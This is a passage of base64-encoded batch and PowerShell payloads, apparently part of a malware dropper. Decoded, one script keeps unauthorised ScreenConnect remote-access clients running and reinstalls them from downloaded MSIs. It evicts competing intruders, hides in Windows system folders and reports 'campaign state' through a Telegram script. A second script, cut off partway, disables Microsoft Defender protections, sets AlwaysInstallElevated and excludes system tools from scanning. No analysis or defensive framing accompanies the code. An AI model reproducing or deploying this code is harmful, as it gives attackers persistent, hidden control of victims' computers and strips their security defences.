TFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAg
ZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiDQogICAgbmV0IHN0YXJ0
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCiAgICBzYyBzdGFy
dCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQogICAgdGltZW91
dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogICAgaWYgZXJyb3JsZXZlbCAxIGlm
IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAt
QWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+
JjENCiAgKQ0KKQ0KcmVtIE0xNzogQUxUIHNlcnZpY2UgZW50cnkgZGVsZXRlZCBidXQgcHJvZHVj
dCByZWdpc3RlcmVkIC0+IHJlcGFpci1ieS1HVUlEIGV2ZXJ5IHRpY2sNCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAo
DQogIGVjaG8gYWx0X21pc3NpbmdfdHJ5X3JlcGFpcj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdE
JVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBh
aXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQopDQpyZW0g
KGV4dGVybWluYXRpb24gYWxyZWFkeSByYW4gcHJlLWhlYWwgaW4gW0VdOyBmb3JlaWduIHN1cnZp
dm9ycyBjb3VudGVkIHRoZXJlKQ0KDQpyZW0g4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAo
cXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAi
dHJ5IHsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnJVdEJScsJyVFVEwlJyAtRXJy
b3JBY3Rpb24gU3RvcCB9IGNhdGNoIHt9IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbR10gcGVy
aW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVXRCVcb3duX3NlY3Vy
ZS5jbWQnKSAtYW5kICgoIC1ub3QgKFRlc3QtUGF0aCAnJVdEJVxzZWMuZmxhZycpKSAtb3IgKCgo
R2V0LURhdGUpIC0gKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJVdEJVxzZWMuZmxhZycpLkxhc3RX
cml0ZVRpbWUpLlRvdGFsSG91cnMgLWdlIDIpKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIg
Pm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+
IiVMT0clIg0KICBjYWxsICIlV0QlXG93bl9zZWN1cmUuY21kIiA+PiIlTE9HJSIgMj4mMQ0KICBl
Y2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQopDQoNCnJlbSDilIDilIAgW0hdIGNhbXBhaWduIHN0
YXRlICsgaG91cmx5IGNvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWls
ZCAlTU9OVkVSJSA+bnVsIDI+JjENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFu
IC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxhc3RXcml0ZVRpbWUp
LlRvdGFsTWludXRlcyAtbHQgNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4m
MQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBoYj4lSEJGTEFHJQ0KICBwb3dlcnNoZWxsIC1O
b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
V0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1CdWlsZCAlTU9OVkVS
JSAtQ291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgZWNobyBkaWdlc3QgSEIgc2VudD4+IiVMT0cl
Ig0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlz
IHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVT
RUxGX1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5Pj4iJUxPRyUiDQogIGF0
dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogIG1vdmUgL3kgIiVX
RCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQpyZW0ga2Vl
cCBkdWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljaw0KaWYgbm90IGV4aXN0ICIlRVRM
JSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAo
DQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5
IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0K
ZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjENCg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBS
SU1fT0slIGFsdD0lQUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUiDQplbmRs
b2NhbA0KZXhpdCAvYiAwDQoNCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZANCjpJbnN0YWxsTXNpDQpyZW0gJTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0K
c2V0ICJUQUc9JX4yIg0KZWNobyBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwl
IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAg
LW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQ0KZm9yICUlRiBpbiAoIiVNU0kl
LnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgNCiAgZWNobyBbJVRBRyVdIGZldGNoIGZh
aWxlZD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVNU0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQg
L2IgMQ0KKQ0KbW92ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KY2FsbCA6Tm9N
c2lQb2xpY3kNCnJlbSBNMTM6IHN0YWxlIHByaW1hcnkgZGlyIChzZXJ2aWNlIGRlbGV0ZWQsIHBy
b2R1Y3QgdW5yZWdpc3RlcmVkKSBicmVha3MNCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBh
Y3Rpb24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFsbGluZw0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSBpZiBleGlz
dCAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiAoDQogIGVjaG8gc3Rh
bGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIlTE9HJSINCiAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQopDQplY2hvIFslVEFHJV0g
bXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3Rh
cnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5s
b2ciID5udWwgMj4mMQ0Kc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCmVjaG8gWyVUQUclXSBt
c2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgN
CiAgZWNobyBbJVRBRyVdIG1zaV9idXN5X3JldHJ5Pj4iJUxPRyUiDQogIHRpbWVvdXQgL3QgMzAg
L25vYnJlYWsgPm51bA0KICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNF
UlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVs
IDI+JjENCiAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgZWNobyBbJVRBRyVdIG1zaWV4
ZWNfcmV0cnkgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCikNCmNhbGwgOldhaXRTdmMNCmV4aXQg
L2IgMA0KDQo6UmVwYWlyUmVnaXN0ZXJlZA0KcmVtICUxPWZpbmdlcnByaW50IC0gc2VydmljZSBk
ZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6IHJlcGFpciBieSBHVUlELg0Kc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglfjEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVs
IDEgZXhpdCAvYiAwDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2IgMQ0K
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlfjEiIC1X
b3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KY2FsbCA6V2FpdFN2Yw0KZXhpdCAvYiAwDQoN
CjpSZXN0b3JlQWx0DQpyZW0gQUxUIHNlcnZpY2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAo
U0MtZmFtaWx5IG1zaWV4ZWMgc2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4NCnNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
cmxldmVsIDEgZXhpdCAvYiAwDQplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0dGVtcHQ+PiIl
TE9HJSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
aWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4i
JUxPRyUiIDI+JjENCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8
IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSIN
CmV4aXQgL2IgMA0KDQo6Tm9Nc2lQb2xpY3kNCnJlZyBkZWxldGUgIkhLTE1cU09GVFdBUkVcUG9s
aWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwg
Mj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1T
SSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0KDQo6V2FpdFN2Yw0K
c2V0ICJUUklFUz0wIg0KOldhaXRMb29wDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAo
DQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBleGl0IC9iIDANCikN
CnNldCAvYSBUUklFUys9MQ0KaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxDQpwaW5nIDEyNy4w
LjAuMSAtbiA3ID5udWwgMj4mMQ0KZ290byA6V2FpdExvb3ANCg0KOlRnU3RhdGUNCnNldCAiTkVX
U1RBVEU9JX4xIg0Kc2V0ICJNU0c9JX4yIg0Kc2V0ICJPTERTVEFURT0iDQppZiBleGlzdCAiJVNU
QVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRFJSINCnJlbSByYXRlLWxpbWl0IHJlcGVhdGVk
IERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDMwIG1pbiB3aGlsZSBzdHVjaw0KaWYgL0kgIiVO
RVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUi
PT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBw
cmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdf
c2VudC5mbGFnIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNv
bW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVX
RCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzMCl7ZXhp
dCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAg
IGVjaG8gdGdfc3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQog
ICkNCikNCjpTZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSINCmVjaG8gc2VudD4i
JVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0
ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09V
TlQlID5udWwgMj4mMQ0KZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJSINCmV4
aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
